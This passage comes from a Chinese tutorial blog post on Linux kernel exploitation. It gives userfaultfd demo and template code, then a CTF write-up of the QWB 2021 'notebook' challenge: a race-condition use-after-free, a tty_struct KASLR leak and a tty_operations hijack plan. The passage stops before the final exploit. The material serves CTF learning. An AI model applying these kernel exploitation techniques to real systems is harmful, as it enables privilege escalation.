class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>    <span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">        demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">        actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">        the userfaultfd. */</span><br>    len = <span class="hljs-number">0x1000</span>;<br>    addr = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>    <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>    <span class="hljs-type">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br><br>    <span class="hljs-comment">/* Trigger the userfaultfd event */</span><br>    <span class="hljs-type">void</span> * ptr = (<span class="hljs-type">void</span>*) *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*) addr;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %p\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据</p>
<p><img src="https://i.loli.net/2021/09/08/7iQO1b64XNaTkG8.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="新版本内核对抗-userfaultfd-在-race-condition-中的利用"><a href="#新版本内核对抗-userfaultfd-在-race-condition-中的利用" class="headerlink" title="新版本内核对抗 userfaultfd 在 race condition 中的利用"></a>新版本内核对抗 userfaultfd 在 race condition 中的利用</h3><p>正所谓“没有万能的银弹”，可能有的人会发现在较新版本的内核中 userfaultfd 系统调用无法成功启动：</p>
<p><img src="https://i.loli.net/2021/09/08/e2LRJKzQVYSTO5k.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>这是因为在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值：</p>
<blockquote>
<p>来自 linux-5.11 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;<br><span class="hljs-comment">//...</span><br>SYSCALL_DEFINE1(userfaultfd, <span class="hljs-type">int</span>, flags)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userfaultfd_ctx</span> *<span class="hljs-title">ctx</span>;</span><br>    <span class="hljs-type">int</span> fd;<br><br>    <span class="hljs-keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;<br>        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="hljs-number">0</span> &amp;&amp;<br>        !capable(CAP_SYS_PTRACE)) &#123;<br>        printk_once(KERN_WARNING <span class="hljs-string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span><br>            <span class="hljs-string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br>            <span class="hljs-string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EPERM;<br>    &#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>来自 linux-5.4 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>在之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong></p>
<p>这意味着在较新版本内核中<strong>只有 root 权限才能使用 userfaultfd</strong>，这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野（<del>微博@来去之间</del>），但不可否认的是，userfaultfd 确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法</p>
<h3 id="CTF-中的-userfaultfd-板子"><a href="#CTF-中的-userfaultfd-板子" class="headerlink" title="CTF 中的 userfaultfd 板子"></a>CTF 中的 userfaultfd 板子</h3><p>userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在使用时直接调用即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">registerUserFaultFd(addr, len, handler);<br></code></pre></td></tr></table></figure>

<p>需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 你要拷贝进去的数据</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [在这停顿.jpg]</span><br><span class="hljs-comment">         * 当 poll 返回时说明出现了缺页异常</span><br><span class="hljs-comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="例题：强网杯2021线上赛-notebook"><a href="#例题：强网杯2021线上赛-notebook" class="headerlink" title="例题：强网杯2021线上赛 - notebook"></a>例题：强网杯2021线上赛 - notebook</h3><h4 id="①-题目分析"><a href="#①-题目分析" class="headerlink" title="① 题目分析"></a>① 题目分析</h4><p>首先看一下启动脚本（<del>写得很 tmd 乱，早该锤锤出题人了</del>）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>stty intr ^]<br>exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s<br></code></pre></td></tr></table></figure>

<p>开了 smap、smep、kaslr 保护</p>
<p>查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code></p>
<p><img src="https://i.loli.net/2021/09/10/TuDM8B52agPXiI4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>开启了 KPTI （内核页表隔离）</p>
<p>给了一个 LKM 叫 <code>notebook.ko</code>，按惯例这应当就是有漏洞的模块了，拖入 IDA 进行分析</p>
<p>大致是创建了一个 misc 类型的设备，并自定义了 ioctl、read、write 三个接口</p>
<p><img src="https://i.loli.net/2021/06/22/Ve8ifgAOLomTj4H.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>定义了一个结构体 <code>note</code> 的数组 <code>notebook</code>，有着两个成员：size 存储堆块的大小，buf 存储指向堆块的地址</p>
<p><img src="https://i.loli.net/2021/06/22/eM1Dknsi8qPXIF7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>题目设备通过 ioctl 模拟了一个菜单（<del>又是菜单堆</del>），提供了创建、编辑、释放堆块的功能</p>
<p><img src="https://i.loli.net/2021/06/22/ebcs7dqulX152fg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们需要传入的参数为如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; userarg;<br></code></pre></td></tr></table></figure>

<p><code>noteadd()</code> 会向 slub 申请不大于 0x60 的 object，不过并不会直接拷贝数据到 object 中，而是会拷贝到 <code>name</code> 字符数组</p>
<p><img src="https://i.loli.net/2021/06/22/6HVQLpBYk1S5EtK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><code>noteedit</code> 用于编辑我们的 notebook 中的 object，若是 size 不同则会调用 krealloc，并将用户空间数据拷贝 256 字节至全局变量 name 中，否则直接返回，与 add 所不同的是 edit 并不会限制 size 大小，因此<strong>虽然 add 限制了 size，但是通过 edit 我们仍能获得任意大小的 object</strong></p>
<p>在这里存在一个漏洞：edit 使用的是<strong>读锁</strong>，可以多个进程并发 <code>realloc(buf, 0)</code> ，从而通过<strong>条件竞争</strong>达到 use after free 的效果</p>
<p><img src="https://i.loli.net/2021/07/31/2Q4vezhdZy61sAf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><code>notedel()</code> 则被用来释放 object，注意到在 <code>notedel()</code> 函数中若是 size 为 0 则不会清空，不过与 ptmalloc 所不同的是，<code>kmalloc(0)</code> 并不会分配一个 object</p>
<p><img src="https://i.loli.net/2021/06/22/voBxLYPGEf9slDz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>注意到在不同操作中还有着读写锁，不过 add 和 edit 占用的是<strong>读</strong>位，而 delete 占用的是<strong>写</strong>位，通俗地说便是：读锁可以被多个进程使用，多个进程此时可以同时进入临界区，而写锁只能被一个进程使用，只有一个进程能够进入临界区</p>
<p><code>notegift()</code> 函数则会白给出分配的 object 的地址，这让本题难度下降不少：)</p>
<p><img src="https://i.loli.net/2021/06/22/1eUIDfFAsaqyOmY.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>题目设备的 <code>read()</code> 则是很普通的读取对应 note 内容的功能，读取的大小为 notebook 结构体数组中存的 size，下标为 read 传入的第三个参数</p>
<p><img src="https://i.loli.net/2021/06/22/m2XhBYuUbKVElH4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>题目设备的 <code>write()</code> 也是很普通的写入对应 note 内容的功能，写入的大小为 notebook 结构体数组中存的 size，下标为 write 传入的第三个参数</p>
<p><img src="https://i.loli.net/2021/06/22/dMnI7hjfyQrZmC4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="②-漏洞利用"><a href="#②-漏洞利用" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h4><h5 id="Step-I-userfaultfd-构造-UAF"><a href="#Step-I-userfaultfd-构造-UAF" class="headerlink" title="Step.I - userfaultfd 构造 UAF"></a>Step.I - userfaultfd 构造 UAF</h5><p>注意到在 mynote_edit 当中使用了 krealloc 来重分配 object，随后使用 copy_fom_user 从用户空间拷贝数据：</p>
<p><img src="https://i.loli.net/2021/09/09/LMEmgrIGoUjwDJ2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么我们可以：</p>
<ul>
<li>分配一个特定大小的 note</li>
<li>新开 edit 线程通过 <code>krealloc(0)</code> 将其释放<strong>，并通过 userfaultfd 卡在这里</strong></li>
</ul>
<p><strong>此时 notebook 数组中的 object 尚未被清空，仍是原先被释放了的 object，我们只需要再将其分配到别的内核结构体上便能完成 UAF</strong></p>
<p>接下来我们就要选择 victim struct 了，这里我们还是选择最经典的 <code>tty_struct</code> 来完成利用，我们只需要打开 <code>/dev/ptmx</code> 便能获得一个 <code>tty_struct</code> ：）</p>
<h5 id="Step-II-泄露内核地址"><a href="#Step-II-泄露内核地址" class="headerlink" title="Step.II - 泄露内核地址"></a>Step.II - 泄露内核地址</h5><p>由于题目提供了读取堆块的功能，故我们可以直接通过 <code>tty_struct</code> 中的 <code>tty_operations</code> 泄露内核基地址，其通常被初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops </code></p>
<p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 <code>ptm_unix98_ops</code> 还是 <code>pty_unix98_ops </code></p>
<p>需要注意的是题目模块中的读写功能会检查 notebook 数组中的 size，而在我们通过 <code>krealloc(0)</code> 构建 UAF 时其被修改为 0，故我们需要将其修改回非 0 值</p>
<p>注意到 <code>noteadd()</code> 中会先修改 notebook 的 size 再 <code>copy_from_user()</code> ，这给了我们利用 userfaultfd 的机会：我们可以通过 <code>noteadd()</code> 将 size 修改回非 0 值并通过 userfaultfd 将其卡住（否则我们的 UAF object 指针会被新分配的 object 覆盖）</p>
<p><img src="https://s2.loli.net/2023/02/07/6EPs7B41O5WS8y3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="Step-III-劫持-tty-operations，控制内核执行流，work-for-cpu-fn-稳定化利用"><a href="#Step-III-劫持-tty-operations，控制内核执行流，work-for-cpu-fn-稳定化利用" class="headerlink" title="Step.III - 劫持 tty_operations，控制内核执行流，work_for_cpu_fn() 稳定化利用"></a>Step.III - 劫持 tty_operations，控制内核执行流，work_for_cpu_fn() 稳定化利用</h5><p>由于题目提供了写入堆块的功能，故我们可以直接通过修改 <code>tty_struct-&gt;tty_operations</code> 后操作 tty（例如read、write、ioctl…这会调用到函数表中的对应函数指针）的方式劫持内核执行流，同时 <code>notegift()</code> 会白给出 notebook 里存的 object 的地址，那么我们可以直接把 <code>fake tty_operations</code> 布置到 note 当中</p>
